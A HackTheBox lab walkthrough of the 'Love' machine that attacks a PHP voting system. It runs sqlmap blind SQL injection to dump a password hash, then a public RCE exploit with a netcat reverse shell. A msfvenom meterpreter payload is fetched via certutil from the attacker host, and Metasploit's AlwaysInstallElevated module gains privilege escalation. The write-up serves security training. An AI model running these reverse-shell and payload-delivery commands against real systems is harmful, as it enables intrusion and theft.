---
layout: page
title: Love
description: Voting System public exploit.
img: 
importance: 4
category: HackTheBox
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/love/logo.png" title="HTB Love Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/Love">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
All you need is love, so let's take on the Love box!

Identify the services by running nmap.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/love]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.239
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 15:46 AEST
Nmap scan report for 10.10.10.239
Host is up (0.36s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: Voting System using PHP
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_http-title: 403 Forbidden
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB 10.3.24 or later (unauthorized)
5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

<snip>
```
{% endraw %}

<br />
Attempt to list the shares on the SMB.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/love]
└─$ smbclient -L //10.10.10.239/                 
Password for [WORKGROUP\kali]:
session setup failed: NT_STATUS_ACCESS_DENIED
```
{% endraw %}

<br />
Check the landing page the webserver is serving.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/love/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the source code to look for anything juicy.

{% raw %}
```html
<!DOCTYPE html>
<html>
<head>
  	<meta charset="utf-8">
  	<meta http-equiv="X-UA-Compatible" content="IE=edge">
  	<title>Voting System using PHP</title>
  	<!-- Tell the browser to be responsive to screen width -->
  	<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
  	<!-- Bootstrap 3.3.7 -->
  	<link rel="stylesheet" href="bower_components/bootstrap/dist/css/bootstrap.min.css">
    <!-- iCheck for checkboxes and radio inputs -->
    <link rel="stylesheet" href="plugins/iCheck/all.css">
  	<!-- DataTables -->
    <link rel="stylesheet" href="bower_components/datatables.net-bs/css/dataTables.bootstrap.min.css">
  	<!-- Font Awesome -->
  	<link rel="stylesheet" href="bower_components/font-awesome/css/font-awesome.min.css">
  	<!-- Theme style -->
  	<link rel="stylesheet" href="dist/css/AdminLTE.min.css">
  	<!-- AdminLTE Skins. Choose a skin from the css/skins
       folder instead of downloading all of them to reduce the load. -->
  	<link rel="stylesheet" href="dist/css/skins/_all-skins.min.css">

<snip>

</html>
```
{% endraw %}

<br />
Check for the existence of a robots.txt file.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/love/robots.png" title="Robots.txt" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the website on 443 to see if it is different.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/love/landing443.png" title="Landing Page HTTPs" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the website running on port 5000.  Weird ports are cool.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/love/landing5000.png" title="Landing Page 5000" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Notice the PHP version (7.3.27) at the bottom of the Forbidden page.  Run that through the Google machine and notice the Voting System 1.0 Exploit-DB listing.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/love/google.png" title="Oogly Googly" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.google.com/search?q=php+7.3.27+exploit">https://www.google.com/search?q=php+7.3.27+exploit</a>

<br />
Check out the exploit-db post and notice the sqli.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/love/exploitdb.png" title="Exploit-DB" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.exploit-db.com/exploits/49817">https://www.exploit-db.com/exploits/49817</a>

<br />
Try the voting login that we discovered earlier and intercept the request in the Burp.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/love/burp.png" title="Burp" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Save the request to a file.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/love]
└─$ cat request.txt             
POST /login.php HTTP/1.1
Host: 10.10.10.239
Content-Length: 25
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.10.239
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.10.239/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=19jmvikgn41ml6q88abh773ff2
Connection: keep-alive

voter=1&password=a&login=
```
{% endraw %}

<br />
Run SQLMap and get a hash.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/love]
└─$ sqlmap -r request.txt --batch --level=1 --risk=3 -r request.txt --dbms=mysql -p voter --all
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___["]_____ ___ ___  {1.9.4#stable}                                                                                                                                                                                                    
|_ -| . [.]     | .'| . |                                                                                                                                                                                                                   
|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:33:28 /2025-06-03/

[16:33:28] [INFO] parsing HTTP request from 'request.txt'
[16:33:28] [INFO] testing connection to the target URL
got a 302 redirect to 'http://10.10.10.239/index.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: voter (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: voter=1' AND (SELECT 8906 FROM (SELECT(SLEEP(5)))YZuc) AND 'WKew'='WKew&password=a&login=
---
[16:33:29] [INFO] testing MySQL
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[16:34:08] [INFO] confirming MySQL
[16:34:08] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[16:34:21] [INFO] adjusting time delay to 4 seconds due to good response times
[16:34:21] [INFO] the back-end DBMS is MySQL
[16:34:21] [INFO] fetching banner
[16:34:21] [INFO] retrieved: 10.4.18-MariaDB
web application technology: PHP 7.3.27, Apache 2.4.46
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
banner: '10.4.18-MariaDB'

<snip>

database management system users [6]:
[*] 'pheobe'@'localhost'
[*] 'phoebe'@'localhost'
[*] 'pma'@'localhost'
[*] 'root'@'127.0.0.1'
[*] 'root'@'::1'
[*] 'root'@'localhost'

<snip>                                                                                                                                                                                      
database management system users password hashes:
[*] pheobe [1]:
    password hash: NULL
[*] phoebe [1]:
    password hash: *8011380027B5ACED186B2FF99181FE050E5CA7A8
[*] pma [1]:
    password hash: NULL
[*] root [1]:
    password hash: NULL

<snip>
```
{% endraw %}

<br />
Check the GitHub for a RCE exploit since we now know what we are running.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/love/github.png" title="GitHub Exploit" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/SamSepiolProxy/Voting-System-1.0-Unauth-RCE/blob/main/exploit.py">https://github.com/SamSepiolProxy/Voting-System-1.0-Unauth-RCE/blob/main/exploit.py</a>

<br />
Download the exploit to the attack machine.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/love]
└─$ wget https://raw.githubusercontent.com/SamSepiolProxy/Voting-System-1.0-Unauth-RCE/refs/heads/main/exploit.py --inet4-only
--2025-06-03 18:07:52--  https://raw.githubusercontent.com/SamSepiolProxy/Voting-System-1.0-Unauth-RCE/refs/heads/main/exploit.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8649 (8.4K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                                 100%[========================================================================================================================================>]   8.45K  --.-KB/s    in 0s      

2025-06-03 18:07:53 (19.3 MB/s) - ‘exploit.py’ saved [8649/8649]
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/love]
└─$ sudo rlwrap nc -nlvp 443                  
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Run the exploit that we just downloaded.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/love]
└─$ python3 exploit.py -t 10.10.10.239 -i 10.10.16.5 -r 443        
Start a NC listner on the port you choose above and run...
Logged in
Poc sent successfully
```
{% endraw %}

<br />
Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/love]
└─$ sudo rlwrap nc -nlvp 443                  
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.239] 53423
b374k shell : connected

Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\omrs\images>
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```powershell-session
C:\Users\Phoebe\Desktop>type user.txt
type user.txt
<redacted>

C:\Users\Phoebe\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.239
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
```
{% endraw %}

<br />
Run the WHOAMIs to see who we are and the privs that we have.

{% raw %}
```powershell-session
C:\Users\Phoebe\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\Users\Phoebe\Desktop>whoami
whoami
love\phoebe
```
{% endraw %}

<br />
Run the systeminfo to get an idea of the system that we are running.

{% raw %}
```powershell-session
C:\Users\Phoebe\Desktop>systeminfo
systeminfo

Host Name:                 LOVE
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19042 N/A Build 19042
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          roy
Registered Organization:   
Product ID:                00330-80112-18556-AA148
Original Install Date:     4/12/2021, 12:14:12 PM
System Boot Time:          6/2/2025, 11:05:52 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.24224532.B64.2408191458, 8/19/2024
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume3
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,662 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 3,296 MB
Virtual Memory: In Use:    1,503 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\LOVE
Hotfix(s):                 9 Hotfix(s) Installed.
                           [01]: KB4601554
                           [02]: KB4562830
                           [03]: KB4570334
                           [04]: KB4577586
                           [05]: KB4580325
                           [06]: KB4586864
                           [07]: KB4589212
                           [08]: KB5000802
                           [09]: KB5000858
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.239
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
{% endraw %}

<br />
Use msfvenom to generate the a meterpreter executable.

{% raw %}
```powershell-session
┌──(kali㉿kali)-[~/Documents/htb/love]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.5 LPORT=4444 -f exe -o meter.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: meter.exe
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/love]
└─$ python3 -m http.server          
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Start a multi/handler to listen for the connection.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/love]
└─$ msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > show options

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.10.16.5:4444
```
{% endraw %}

<br />
Transfer the executable to the victim machine.

{% raw %}
```powershell-session
C:\Users\Phoebe\Desktop>certutil.exe -urlcache -f http://10.10.16.5:8000/meter.exe meter.exe
certutil.exe -urlcache -f http://10.10.16.5:8000/meter.exe meter.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```
{% endraw %}

<br />
Execute the executable and check the handler to catch the session.

{% raw %}
```bash
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.10.16.5:4444 
[*] Sending stage (177734 bytes) to 10.10.10.239
[*] Meterpreter session 1 opened (10.10.16.5:4444 -> 10.10.10.239:64912) at 2025-06-03 18:29:01 +1000

meterpreter >
```
{% endraw %}

<br />
Run the exploit suggester.

{% raw %}
```bash
meterpreter > 
Background session 1? [y/N]  
msf6 exploit(multi/handler) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > exploit
[*] 10.10.10.239 - Collecting local exploits for x86/windows...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] 10.10.10.239 - 205 exploit checks are being tried...
[+] 10.10.10.239 - exploit/windows/local/always_install_elevated: The target is vulnerable.
[+] 10.10.10.239 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.
[+] 10.10.10.239 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[*] Running check method for exploit 42 / 42
[*] 10.10.10.239 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/always_install_elevated                  Yes                      The target is vulnerable.
 2   exploit/windows/local/bypassuac_fodhelper                      Yes                      The target appears to be vulnerable.

 <snip>
```
{% endraw %}

<br />
Choose the always elevated exploit from the list and run it.

{% raw %}
```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/always_install_elevated
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/always_install_elevated) > show options

Module options (exploit/windows/local/always_install_elevated):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.20.20    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/always_install_elevated) > set session 1
session => 1
msf6 exploit(windows/local/always_install_elevated) > set lhost tun0
lhost => 10.10.16.5
msf6 exploit(windows/local/always_install_elevated) > exploit
[*] Started reverse TCP handler on 10.10.16.5:4444 
[*] Uploading the MSI to C:\Users\Phoebe\AppData\Local\Temp\UaKUyglxKsad.msi ...
[*] Executing MSI...
[*] Sending stage (177734 bytes) to 10.10.10.239
[+] Deleted C:\Users\Phoebe\AppData\Local\Temp\UaKUyglxKsad.msi
[*] Meterpreter session 2 opened (10.10.16.5:4444 -> 10.10.10.239:64913) at 2025-06-03 18:34:58 +1000

meterpreter >
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```bash
C:\Users\Administrator\Desktop>type root.txt
type root.txt
<redacted>

C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.239
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
```
{% endraw %}

<br />
Love, love, love is all you need.  Hope you enjoyed the read.  See you in the next one.